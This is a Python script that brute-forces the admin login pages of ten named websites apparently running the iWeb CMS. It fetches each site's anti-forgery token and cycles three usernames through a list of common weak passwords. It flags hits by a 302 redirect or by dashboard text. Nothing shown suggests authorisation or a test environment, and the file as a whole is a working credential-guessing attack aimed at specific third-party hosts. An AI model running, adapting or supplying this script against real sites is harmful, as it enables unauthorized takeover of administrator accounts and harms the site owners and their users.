#!/usr/bin/env python3
"""iWeb batch login brute - 10 AH sites, shared weak pw list
Login: POST /admin/login.html?ReturnUrl=%2fadmin%2f  UserName/Password/__RequestVerificationToken
Success: 302 redirect (vs 200 re-render)
"""
import urllib.request, urllib.parse, re, http.cookiejar, time, sys

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
SITES = ["ahbill.com", "ahzfgg.com", "ahyyhb.net", "ahhubang.com", "ahhzlq.com",
         "ahsjkx.net", "ahxiyy.com", "ahtlt.com.cn", "ahzyhh.com", "ahygfz.com"]

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(op, url, timeout=10, data=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

PWS = ["admin", "admin123", "123456", "admin888", "iweb", "iweb123", "iweb888",
       "a123456", "12345678", "admin666", "admin@123", "Aa123456", "123456789",
       "password", "admin123456", "abc123", "123123", "888888", "admin000",
       "admin1", "admin12", "123456a", "a123456789", "111111", "666666",
       "admin2024", "admin2025", "iweb2024", "iweb2025", "admin12345", "1234567890",
       "qwerty", "iloveyou", "5201314", "woaini", "000000", "1q2w3e4r"]

def try_login(site, user, pw):
    op = get_opener()
    code, final, body = fetch(op, "http://" + site + "/admin/login.html")
    m = re.search(r'__RequestVerificationToken[^>]*value="([^"]+)"', body) or \
        re.search(r'__RequestVerificationToken[^>]*value="([^"]+)"\s*/?>', body)
    if not m:
        return "no-token"
    token = m.group(1)
    data = urllib.parse.urlencode({"UserName": user, "Password": pw, "submit": "login",
                                   "__RequestVerificationToken": token})
    code, final, body = fetch(op, "http://" + site + "/admin/login.html?ReturnUrl=%2fadmin%2f", data=data)
    # success = redirect to /admin/ (302) or dashboard content
    if code == 302 and "/admin" in final:
        return "HIT-302"
    if "退出" in body or "logout" in body.lower() or "管理首页" in body:
        return "HIT-BODY"
    return "miss"

# per site: try admin + common users
for site in SITES:
    print("=== %s ===" % site, flush=True)
    hit = False
    for user in ["admin", "iweb", "Administrator"]:
        for pw in PWS:
            r = try_login(site, user, pw)
            if r.startswith("HIT"):
                print("  !!! %s/%s %s" % (user, pw, r), flush=True)
                hit = True
                break
            if r == "no-token":
                print("  no token (blocked?)", flush=True)
                break
            time.sleep(0.3)
        if hit:
            break
    if not hit:
        print("  no hit", flush=True)
    time.sleep(1)
